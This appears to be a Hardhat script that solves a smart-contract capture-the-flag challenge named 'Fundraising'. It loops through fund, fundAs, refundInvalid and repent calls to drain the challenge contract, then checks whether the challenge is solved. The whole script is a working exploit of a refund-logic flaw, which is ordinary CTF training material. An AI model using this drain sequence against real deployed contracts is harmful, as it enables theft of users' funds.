// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { parseEther } = require("ethers/lib/utils");

async function main() {
  

  //get accounts and verify balances
  const [accounts, account2] = await hre.ethers.getSigners();
  console.log("Signer is: ", accounts.address);

  
  //set addresses for current challenge
  const setupAddress = "0x0dCb022a9927613f1B4B23F4F893515BA196c5c5";
  const challengeAddress = "0x44898e95E81600e7aD0a85F7e1A5daA987BC1365";
  const challengeName = "Fundraising";
  const setupName = "SetupBackup";

   
  //attach setup
  const setupContract = await hre.ethers.getContractAt(setupName, setupAddress);
  //attach challenge
  const challengeContract = await hre.ethers.getContractAt(challengeName, challengeAddress);

  //verify unsolved
  console.log("Solved before ?: ", await setupContract.isSolved());
  console.log("Starting balance:", await ethers.provider.getBalance(challengeAddress));

  //exploit logic
  //deploy an exploit that will interact with the challenge
  
  for(let i=0;i<5; i++)
  {

  await challengeContract.fund({ value: parseEther("0.000001") });
  console.log("Funded as hacker");
  await challengeContract.fundAs(account2.address,{ value: parseEther("0.0000004")} );
  console.log("Funded as second acct");
  await challengeContract.refundInvalid(account2.address);
  console.log("Refund invalid");
  await challengeContract.repent();
  console.log("Refunded normal", await ethers.provider.getBalance(challengeAddress));
  console.log("New balance:", await ethers.provider.getBalance(challengeAddress));
  
}
  
  
  
  //verify solved
  console.log("Solved after?: ", await setupContract.isSolved());
  //await exploit.solve1({value: parseEther("1")});
  

  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
